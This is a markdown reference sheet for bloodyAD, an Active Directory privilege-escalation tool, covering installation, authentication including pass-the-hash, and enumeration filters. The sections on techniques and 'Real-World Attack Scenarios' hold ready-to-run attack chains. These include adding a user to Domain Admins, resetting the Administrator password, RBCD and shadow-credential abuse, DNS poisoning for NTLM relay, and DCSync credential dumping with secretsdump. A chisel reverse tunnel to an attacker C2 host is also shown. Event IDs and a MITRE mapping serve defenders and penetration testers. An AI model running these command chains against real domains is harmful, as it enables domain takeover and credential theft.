---
title: bloodyAD
tool: bloodyAD
version: 2.5.4
category: Privilege Escalation
platform: Linux
language: Python
license: MIT
github: https://github.com/CravateRouge/bloodyAD
kali: https://www.kali.org/tools/bloodyad/
mitre_tactic: privilege_escalation
mitre_tactic_id: TA0004
tags:
  - active-directory
  - ldap
  - privesc
  - kerberos
  - pass-the-hash
  - shadow-credentials
  - dns
---

# bloodyAD

## 1. Overview

**bloodyAD** is an Active Directory privilege escalation swiss army knife that performs targeted LDAP calls to a domain controller. It supports multiple authentication methods (cleartext passwords, pass-the-hash, pass-the-ticket, certificates), works over SOCKS proxies, and does not require LDAPS for sensitive operations.

**Key capabilities:**
- LDAP-based AD privilege escalation without Impacket dependency
- Supports NTLM, Kerberos, certificate (Schannel/PKINIT) authentication
- Shadow Credentials attack, targeted Kerberoasting, RBCD abuse
- DNS record manipulation for AD-integrated zones
- Works transparently through SOCKS5 proxies
- Built on MSLDAP engine by @skelsec
- JSON output for scripting and toolchain integration
- Verbose/debug/trace logging for troubleshooting LDAP operations

**Advantages over Impacket:**
- Pure Python with fewer dependencies
- Native SOCKS5 proxy support (Impacket requires external proxychains)
- Works without LDAPS (supports plaintext LDAP for sensitive operations)
- Simpler syntax for common AD privesc operations
- Active development with frequent CVE exploit additions

**Typical scenarios:** Post-exploitation on Windows networks where an attacker has obtained domain credentials and needs to escalate privileges within Active Directory.

## 2. Installation

### Kali Linux (Package)

```bash
sudo apt install bloodyad
```

**Installed size:** ~49.50 MB (includes Python dependencies).

**Verification:**

```bash
bloodyAD --version
# or
bloodyAD -h
```

### From Source (Latest)

```bash
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip install -r requirements.txt
python bloodyAD.py -h
```

### Dependencies

- Python 3.x (3.8+ recommended)
- msladap (engine by @skelsec)
- pyasn1
- cryptography
- gssapi (optional, for Kerberos)

**Caveat:** The Kali package installs a specific version. For bleeding-edge features (new CVE exploits, latest attack modules), use the GitHub repository. The package may lag behind by several releases.

### Updating

```bash
# Kali package
sudo apt update && sudo apt upgrade bloodyad

# From source
cd bloodyAD && git pull && pip install -r requirements.txt
```

## 3. Authentication Methods

### 3.1 NTLM (Password)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' get object dc01
```

**Explanation:** Authenticates using username/password over NTLM. The `-d` flag specifies the domain, `-u` the username, `-p` the password. This is the most common authentication method for initial access.

**Requirements:** The user account must not have "Account is sensitive and cannot be delegated" set, and the DC must accept NTLM authentication.

### 3.2 Pass-the-Hash (NTLM Hash)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u administrator \
  -p :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b \
  set password jsmith 'NewP@ss123'
```

**Explanation:** Pass the NTLM hash directly using `LMHASH:NTHASH` format. The colon prefix triggers hash-based authentication. The LM hash can be the NTLM default (`aad3b435b51404eeaad3b435b51404ee`) when only the NT hash is known.

**When to use:** After dumping NTLM hashes from SAM database, LSA secrets, or DCSync. Useful when the plaintext password is unavailable but the hash was captured.

### 3.3 Kerberos (Password)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u administrator -p 'P@ssw0rd123' -k get object dc01
```

**Explanation:** The `-k` flag enables Kerberos authentication. With `-p` provided, bloodyAD queries a TGT automatically from the KDC. This avoids NTLM detection by security monitoring tools.

### 3.4 Kerberos (Existing TGT)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u administrator \
  -k kdc=192.168.1.10 ccache=/tmp/administrator.ccache get object dc01
```

**Explanation:** Uses a pre-existing ccache file. The `kdc` parameter specifies the KDC, and `ccache` points to the ticket file. Supports `ccache`, `kirbi`, and `keytab` formats.

**Caveat:** The ccache file must match the target domain and user. Cross-realm tickets require additional `realmc` and `kdcc` parameters.

### 3.5 Kerberos (Keytab)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin \
  -k kdc=192.168.1.10 keytab=/tmp/admin.keytab get object dc01
```

**Explanation:** Authenticates using a keytab file extracted from a service account. Useful when the keytab was obtained via Kerberoasting or service account compromise.

### 3.6 Certificate Authentication (Schannel)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin \
  -c 'path/to/key.pem:path/to/cert.pem' get object dc01
```

**Explanation:** Schannel authentication using a private key and certificate pair. The format is `key_path:cert_path`. This uses LDAPS with client certificate authentication.

### 3.7 Certificate Authentication (PKINIT)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin \
  -k -c 'path/to/key.pem:path/to/cert.pem' get object dc01
```

**Explanation:** Combines `-k` (Kerberos) with `-c` (certificate) for PKINIT authentication. This obtains a Kerberos TGT using the certificate, enabling Kerberos-based attacks.

**When to use:** After the Shadow Credentials attack has added a controlled key to a target account's `msDS-KeyCredentialLink`.

### 3.8 Windows Certificate Store

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin \
  -k -c get object dc01
```

**Explanation:** When `-c` is left empty with `-k`, bloodyAD attempts to use the Windows certificate store (Sch Cert Store) for PKINIT. Only works on Windows hosts.

### 3.9 LDAPS (TLS)

```bash
bloodyAD --host dc01.corp.local -d corp.local -u admin -p 'P@ssw0rd123' -s get object dc01
```

**Explanation:** The `-s` flag forces LDAPS/GCS connections. Use `-ss` to disable all encryption (useful for debugging or when LDAPS is not available).

**Caveat:** Using `-ss` transmits credentials in plaintext. Only use in lab environments or when debugging LDAP issues.

## 4. Command Categories

bloodyAD organizes functions into five categories:

| Category | Purpose | Example |
|----------|---------|---------|
| `get` | Read/enumerate AD objects | `get object`, `get writable` |
| `set` | Modify AD object properties | `set password`, `set rbcd` |
| `add` | Create new AD objects | `add computer`, `add groupMember` |
| `remove` | Delete AD objects | `remove object`, `remove groupMember` |
| `msldap` | Raw MSLDAP operations | Direct LDAP queries |

### Category: GET

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' get --help
```

**Available functions:**
- `get object` — Read AD object attributes
- `get writable` — Find objects with weak ACLs
- `get nested` — Get nested group memberships
- `get orphans` — Find orphaned objects

### Category: SET

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' set --help
```

**Available functions:**
- `set password` — Reset user password
- `set owner` — Change object owner
- `set rbcd` — Configure RBCD delegation
- `setGenericAll` — Grant GenericAll permission
- `set dnsRecord` — Modify DNS records

### Category: ADD

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' add --help
```

**Available functions:**
- `add groupMember` — Add user to group
- `add shadowCredentials` — Add shadow credential key
- `add computer` — Create computer account
- `add dnsRecord` — Create DNS record
- `add object` — Create arbitrary AD object

### Category: REMOVE

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' remove --help
```

**Available functions:**
- `remove groupMember` — Remove user from group
- `remove object` — Delete AD object
- `remove shadowCredentials` — Remove shadow credential key
- `remove dnsRecord` — Delete DNS record

## 5. Privilege Escalation Techniques

### 5.1 Set Password (Credential Reset)

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  set password targetuser 'NewP@ss123!'
```

**Explanation:** Resets the password of `targetuser` if `jsmith` has `User-Force-Change-Password` or `RESET_PASSWORD` on the target's `ds-Change-Password` extended right.

**Required permissions:**
- `GenericAll` on the target user, OR
- `Reset Password` (Extended Right GUID: 00299570-246d-11d0-a768-00aa006e0529) on the target user

**Detection:** This operation generates Event ID 4724 (An attempt was made to reset an account's password) on the domain controller.

### 5.2 Add User to Group

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  add groupMember "Domain Admins" jsmith
```

**Explanation:** Adds `jsmith` to the `Domain Admins` group. Requires the user to have `GenericAll` or `WriteMember` on the group.

**Required permissions:**
- `GenericAll` on the target group, OR
- `WriteMember` (Write Property on `member`) on the target group

**Detection:** This operation generates Event ID 4728 (A member was added to a security-enabled local group) or Event ID 4756 (A member was added to a security-enabled universal group).

**Common high-value groups:**
- `Domain Admins`
- `Enterprise Admins`
- `Schema Admins`
- `Administrators`
- `Account Operators`
- `Backup Operators`

### 5.3 Set RBCD (Resource-Based Constrained Delegation)

```bash
# Step 1: Create a controlled computer account
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  add computer controlled$ 'Comput3rP@ss!'

# Step 2: Set RBCD on target
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  set rbcd target$ 'COMPROB$/$(controlled-SID)' --writeable

# Step 3: Get ticket as any user (e.g., administrator)
# Use getST.py or similar tool with the computer account hash
getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/controlled$:Comput3rP@ss!
```

**Explanation:** Writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target, allowing the controlled computer account to impersonate any user. Requires `GenericAll` or `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`.

**Required permissions:**
- `GenericAll` on the target computer, OR
- `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`

**Detection:** This operation generates Event ID 4742 (A computer account was changed) on the target computer.

**Caveat:** The target must have a Service Principal Name (SPN) registered. If not, the attack will fail at the ticket request stage.

### 5.4 Shadow Credentials

```bash
# Step 1: Add shadow credential
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  add shadowCredentials targetuser

# Step 2: Request TGT using PKINIT
gettgtpkinit.py -cert_pfx <pfx_file> -pfx_pass <password> corp.local/targetuser targetuser.ccache

# Step 3: Use TGT for further operations
export KRB5CCNAME=targetuser.ccache
```

**Explanation:** Abuses `msDS-KeyCredentialLink` to add a controlled key, enabling PKINIT authentication as the target. Requires `GenericAll` or `WriteProperty` on `msDS-KeyCredentialLink`.

**Required permissions:**
- `GenericAll` on the target user, OR
- `WriteProperty` on `msDS-KeyCredentialLink`

**Detection:** This operation generates Event ID 5136 (A directory service object was modified) on the domain controller.

### 5.5 Targeted Kerberoasting

```bash
# Enumerate Kerberoastable accounts
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  get object --filter '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr servicePrincipalName sAMAccountName memberOf pwdLastSet

# For specific target, check password age
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  get object svc_sql --attr servicePrincipalName sAMAccountName pwdLastSet memberOf
```

**Explanation:** Enumerates Service Principal Names to identify Kerberoastable accounts. Focus on accounts with old passwords (weak hash cracking), high group memberships, or AdminCount=1.

### 5.6 DCSync via ACL Abuse

```bash
# Enumerate DCSync rights
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  get writable --otype user --right DCSync

# Check domain root ACL
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  get object 'DC=corp,DC=local' --attr nTSecurityDescriptor
```

**Explanation:** Identifies user objects where the current user has DCSync rights (Replicating Directory Changes / Replicating Directory Changes All). Use `get object` to read `ms-DS-Replication-Permissions` on the domain root.

**Detection:** DCSync operations generate Event ID 4662 (An operation was performed on an object) with Properties containing the replication GUIDs.

### 5.7 DNS Record Manipulation

```bash
# Add A record for relay
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  add dnsRecord ldap.dc01._msdcs.corp.local 10.10.14.5 A

# Modify existing record
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  add dnsRecord dc01.corp.local 10.10.14.5 A

# Delete record
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  remove dnsRecord ldap.dc01._msdcs.corp.local A
```

**Explanation:** Creates or modifies DNS records in AD-integrated zones. Useful for redirecting authentication (e.g., modifying `ldap/dc01.corp.local` to point to an attacker-controlled host for NTLM relay).

**Required permissions:**
- `GenericAll` on the DNS zone, OR
- `WriteProperty` on `dnsRecord`

### 5.8 Owner Takeover

```bash
# Take ownership of an object
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  set owner jsmith targetuser

# Then grant GenericAll
bloodyAD --host 192.168.1.10 -d corp.local -u jsmith -p 'P@ssw0rd123' \
  setGenericAll targetuser jsmith
```

**Explanation:** Changes the owner of an AD object, then grants full control. This is useful when you have `WriteOwner` but not `GenericAll`.

**Required permissions:**
- `WriteOwner` on the target object (for ownership change)
- After ownership: full control to modify any property

## 6. Enumeration Commands

### 6.1 Object Enumeration

```bash
# List all domain controllers
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(objectClass=computer)' \
  --attr dNSHostName operatingSystem servicePrincipalName

# Find users with SPN (Kerberoastable)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr servicePrincipalName sAMAccountName memberOf pwdLastSet

# Find ASREPRoastable accounts (DONT_REQ_PREAUTH)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  --attr sAMAccountName memberOf

# Find disabled accounts (potential password reuse)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
  --attr sAMAccountName lastLogonTimestamp

# Find accounts with password not required
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' \
  --attr sAMAccountName

# Find accounts with unconstrained delegation
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
  --attr sAMAccountName dNSHostName

# Find accounts with constrained delegation
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(msDS-AllowedToDelegateTo=*)' \
  --attr sAMAccountName msDS-AllowedToDelegateTo

# Find admin count users (privileged accounts)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(adminCount=1)' --attr sAMAccountName memberOf

# List all OUs
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(objectClass=organizationalUnit)' --attr distinguishedName
```

### 6.2 Writable Object Enumeration

```bash
# Objects writable by current user with GenericAll
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable --otype user

# Objects with DCSync rights
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable --otype user --right DCSync

# Objects with WriteProperty rights
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable --otype user --right WriteProperty

# Writable computer objects
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable --otype computer

# All writable objects
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable
```

### 6.3 Trust Enumeration

```bash
# Domain trusts
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object --filter '(objectClass=trustedDomain)' \
  --attr name trustDirection trustType trustAttributes

# SID filtering status
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object 'DC=corp,DC=local' --attr msDS-SupportedEncryptionTypes
```

### 6.4 Group Membership Enumeration

```bash
# Domain Admins members
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object "Domain Admins" --attr member

# Enterprise Admins members
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object "Enterprise Admins" --attr member

# Nested group memberships for a user
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get nested jsmith
```

### 6.5 LDAP Filter Reference

| Filter | Description |
|--------|-------------|
| `(objectClass=user)` | All user objects |
| `(objectClass=computer)` | All computer objects |
| `(objectClass=group)` | All group objects |
| `(servicePrincipalName=*)` | Kerberoastable accounts |
| `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` | ASREPRoastable |
| `(userAccountControl:1.2.840.113556.1.4.803:=524288)` | Unconstrained delegation |
| `(msDS-AllowedToDelegateTo=*)` | Constrained delegation |
| `(adminCount=1)` | Admin count (privileged) |
| `(memberOf=*)` | Has group membership |
| `(&(objectClass=user)(pwdLastSet=0))` | Password never set |
| `(&(objectClass=user)(lockoutTime>=1))` | Locked accounts |

## 7. SOCKS Proxy Support

bloodyAD supports transparent SOCKS5 proxy usage:

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --socks socks5://127.0.0.1:1080 get object dc01
```

**Explanation:** All LDAP traffic routes through the specified SOCKS proxy. This is essential when pivoting through compromised hosts.

**Setup with Chisel:**

```bash
# On attacker (C2 server)
chisel server --reverse --port 8000

# On compromised host
chisel client 10.10.14.5:8000 R:socks
```

Then use `--socks socks5://127.0.0.1:1080` with bloodyAD.

**Caveat:** SOCKS support requires PySocks. Performance may degrade over slow or high-latency connections due to LDAP chatty protocols. Consider using the `--timeout` flag for slow connections.

## 8. JSON Output

```bash
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --json get object dc01
```

**Explanation:** Outputs results in JSON format, enabling scripted parsing and integration with other tools.

**Scripting example:**

```bash
# Extract all Kerberoastable accounts as JSON
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  --json get object --filter '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr servicePrincipalName sAMAccountName | \
  jq -r '.[].sAMAccountName'
```

## 9. Verbose and Debug Modes

```bash
# Info level
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v INFO get object dc01

# Debug level (full LDAP packet inspection)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v DEBUG get object dc01

# Trace level (maximum detail)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v TRACE get object dc01

# Quiet mode (minimal output)
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v QUIET get object dc01
```

**Debug output is useful for:**
- Troubleshooting LDAP connection issues
- Identifying ACL permission failures
- Verifying the exact LDAP filters being sent
- Debugging Kerberos ticket acquisition
- Inspecting certificate authentication flow

## 10. Error Handling and Troubleshooting

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `LDAP session error` | Invalid credentials or DC unreachable | Verify host, domain, username, password |
| `Insufficient access rights` | Missing required ACL permissions | Enumerate with `get writable` first |
| `No such object` | Target DN does not exist | Verify the target distinguished name |
| `Kerberos: No credentials cache found` | No TGT available | Use `-p` with `-k` or provide ccache |
| ` certificate verify failed` | LDAPS cert issue | Use `-s` or check CA trust |
| `Connection timeout` | Slow network or firewall | Increase `--timeout` value |

### Debugging Workflow

```bash
# Step 1: Test connectivity
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  -v DEBUG get object 'DC=corp,DC=local'

# Step 2: Check permissions
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get writable --otype user

# Step 3: Verify target exists
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  get object targetuser --attr sAMAccountName

# Step 4: Attempt the operation
bloodyAD --host 192.168.1.10 -d corp.local -u admin -p 'P@ss' \
  set password targetuser 'NewP@ss123!'
```

## 11. Real-World Attack Scenarios

### Scenario 1: Initial Access to Domain Admin

**Situation:** Compromised a standard user account (`jsmith`) with `GenericAll` on a group.

```bash
# 1. Verify permissions
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  get writable --otype group

# 2. Add to privileged group
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add groupMember "Help Desk" jsmith

# 3. Use Help Desk to reset admin password
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set password Administrator 'NewP@ss123!'

# 4. Verify access
bloodyAD -H 192.168.1.10 -d corp.local -u Administrator -p 'NewP@ss123!' \
  get object 'DC=corp,DC=local'
```

### Scenario 2: RBCD Attack Chain

**Situation:** Compromised a user with `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
# 1. Create computer account
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add computer controlled$ 'Comput3rP@ss!'

# 2. Get computer SID
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  get object controlled$ --attr objectSid

# 3. Set RBCD
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  set rbcd target$ 'CORP/controlled$' --writeable

# 4. Get service ticket as administrator
getST.py -spn cifs/target.corp.local -impersonate administrator \
  corp.local/controlled$:Comput3rP@ss!

# 5. Use the ticket
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL
psexec.py -k -no-pass target.corp.local
```

### Scenario 3: Shadow Credentials to DCSync

**Situation:** Compromised a user with `GenericAll` on a domain controller computer account.

```bash
# 1. Add shadow credential
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add shadowCredentials dc01$

# 2. Request TGT
gettgtpkinit.py -cert_pfx <pfx> -pfx_pass <pass> \
  corp.local/dc01$ dc01.ccache

# 3. Use TGT for DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass corp.local/dc01$@dc01.corp.local
```

### Scenario 4: DNS Relay to NTLM Relay

**Situation:** Compromised a user with DNS modify rights.

```bash
# 1. Modify LDAP DNS record
bloodyAD -H 192.168.1.10 -d corp.local -u jsmith -p 'P@ss' \
  add dnsRecord ldap.dc01._msdcs.corp.local 10.10.14.5 A

# 2. Set up relay
ntlmrelayx.py -t 192.168.1.10 -socks -smb2support

# 3. Trigger authentication (e.g., PrinterBug)
printerbug.py corp.local/jsmith:'P@ss'@192.168.1.10

# 4. Use relayed connection
secretsdump.py -just-dc-ntlm -socks corp.local/dc01$@dc01.corp.local
```

## 12. MITRE ATT&CK Mapping

| Technique ID | Technique Name | bloodyAD Command |
|-------------|----------------|-----------------|
| T1078 | Valid Accounts | NTLM/Kerberos authentication with compromised credentials |
| T1134.002 | Token Manipulation: Pass the Hash | `-p :LMHASH:NTHASH` |
| T1557 | Adversary-in-the-Middle | DNS record manipulation for relay |
| T1078.002 | Domain Accounts | RBCD abuse via `set rbcd` |
| T1558 | Steal Kerberos TGT | Targeted Kerberoasting via `get object` |
| T1556 | Modify Authentication Process | Shadow Credentials via `add shadowCredentials` |
| T1098 | Account Manipulation | `add groupMember`, `set password` |
| T1003 | OS Credential Dumping | DCSync via ACL enumeration |
| T1572 | Protocol Tunneling | SOCKS proxy support |
| T1087 | Account Discovery | `get object` enumeration filters |
| T1134 | Access Token Manipulation | Kerberos ticket reuse via `-k` |
| T1550 | Use Alternate Authentication Material | Certificate authentication via `-c` |

## Resources

- [GitHub Repository](https://github.com/CravateRouge/bloodyAD)
- [bloodyAD Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
- [Kali Linux Package](https://www.kali.org/tools/bloodyad/)
- [Access Control Wiki Page](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)
- [Authentication Methods Wiki](https://github.com/CravateRouge/bloodyAD/wiki/Authentication-Methods)
- [CVEs Exploit Wiki](https://github.com/CravateRouge/bloodyAD/wiki/CVEs-Exploit)
- [Enumeration Wiki](https://github.com/CravateRouge/bloodyAD/wiki/Enumeration)
- [CravateRouge Articles](https://cravaterouge.com/articles/)
- [HackTricks - Active Directory](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [MSLDAP Library](https://github.com/skelsec/msldap)
- [Impacket LDAP Attacks (reference)](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/ldapattack.py)
- [autobloody (Automated Attack Paths)](https://github.com/CravateRouge/autobloody)
